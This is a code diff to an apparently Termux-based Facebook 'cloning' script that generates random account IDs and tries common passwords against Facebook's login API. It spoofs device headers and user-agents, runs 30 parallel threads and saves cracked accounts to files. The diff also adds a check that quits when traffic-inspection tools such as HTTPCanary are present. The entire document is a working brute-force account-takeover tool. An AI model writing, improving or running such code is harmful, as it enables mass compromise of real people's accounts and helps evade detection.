@@ -9,11 +9,61 @@ import re
 import threading
 import platform
 import hashlib
+import signal
 from datetime import datetime
 from bs4 import BeautifulSoup
 from random import randint as rr
 from concurrent.futures import ThreadPoolExecutor as tred
 import requests
+
+# Global variables
+method = []; oks = []; cps = []; loop = 0; user = []
+
+# -------------------- Initial Setup --------------------
+# Ensure required modules are installed
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
+    try:
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module}')
+
+# Suppress InsecureRequestWarning
+from requests.exceptions import ConnectionError
+from requests import api, models, sessions
+requests.urllib3.disable_warnings()
+
+# Initial setup and promotion
+os.system('clear')
+print(' \x1b[38;5;46mAHB SERVER LOADING....')
+
+# --- Anti-tampering and Security Checks ---
+class sec:
+    def __init__(self):
+        self.__module__ = __name__
+        self.__qualname__ = 'sec'
+        paths = [
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
+        ]
+        for path in paths:
+            if os.path.exists(path):
+                if 'print' in open(path, 'r').read():
+                    self.fuck()
+        # Check for HTTPCanary
+        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
+            self.fuck()
+        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
+            self.fuck()
+
+    def fuck(self):
+        print(' \x1b[1;32m Congratulations ! ')
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        exit()
+
+# Run security checks
+sec()
 
 # -------------------- Global Utility & Width --------------------
 
@@ -298,6 +348,21 @@ def check_activation():
 
 # -------------------- Cloning Logic --------------------
 
+def windows():
+    """Generates a random Windows User-Agent string with more variations."""
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
+    return random.choice([A, B, C, D])
+
 def window1():
     aV = str(random.choice(range(10, 20)))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
@@ -376,8 +441,17 @@ def login_2(uid):
             sys.stdout.write(msg); sys.stdout.flush()
         for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
             with requests.Session() as session:
-                headers = {'user-agent': window1(), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+                headers = {
+                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
+                    'x-fb-sim-hni': str(rr(20000, 40000)),
+                    'x-fb-net-hni': str(rr(20000, 40000)),
+                    'x-fb-connection-quality': 'EXCELLENT',
+                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+                    'user-agent': window1(),
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'x-fb-http-engine': 'Liger'
+                }
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
                     console.log(f"[bold green]AHB-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
@@ -410,6 +484,8 @@ def old_clone_menu():
         else: show_error("Invalid option")
 
 def cloning_process(name, prefixes):
+    global stop_cloning, oks, cps
+    stop_cloning = False
     header()
     console.print("\n [bold yellow]CLONING SETUP[/bold yellow]")
     linex()
@@ -432,24 +508,34 @@ def cloning_process(name, prefixes):
         else: uid = prefixes + ''.join(random.choices('0123456789', k=8))
         user.append(uid)
     header()
-    console.print("\n [bold red]CRACKING STARTED[/bold red]")
+    console.print("\n [bold red]CRACKING STARTED (Press Ctrl+C to stop)[/bold red]")
     linex()
-    console.print(f" ▎ [bold cyan]total IDs[/bold cyan]    [bold yellow]{len(user)}[/bold yellow]")
-    console.print(f" ▎ [bold cyan]method[/bold cyan]       [bold green]METHOD {meth}[/bold green]")
-    console.print("\n [bold red]USE AIRPLANE MODE EVERY 5 MINUTES![/bold red]")
-    linex()
-    with tred(max_workers=30) as pool:
+    
+    pool = tred(max_workers=30)
+    try:
         for uid in user:
             if meth == 'A': pool.submit(login_1, uid)
             else: pool.submit(login_2, uid)
+        pool.shutdown(wait=True)
+    except KeyboardInterrupt:
+        pool.shutdown(wait=False)
+    
+    # Save progress
+    if oks:
+        with open('/sdcard/AHB-OK.txt', 'a') as f:
+            for uid in oks: f.write(f"{uid}\n")
+    if cps:
+        with open('/sdcard/AHB-CP.txt', 'a') as f:
+            for uid in cps: f.write(f"{uid}\n")
+
     console.print("\n"); linex()
-    console.print("\n [bold green]CRACKING COMPLETED[/bold green]")
+    console.print("\n [bold green]CRACKING COMPLETED/INTERRUPTED[/bold green]")
     linex()
     console.print(f" ▎ [bold green]successful[/bold green]    [bold white]{len(oks)}[/bold white]")
     console.print(f" ▎ [bold yellow]checkpoint[/bold yellow]    [bold white]{len(cps)}[/bold white]")
     console.print("\n [bold cyan]DATA SAVED[/bold cyan]")
     linex()
-    console.print(" Results saved to: [cyan]/sdcard/WEBT-OK.txt[/cyan]")
+    console.print(" Results saved to: [cyan]/sdcard/AHB-OK.txt[/cyan]")
     linex()
     safe_input(" Press Enter to return to menu...")
 
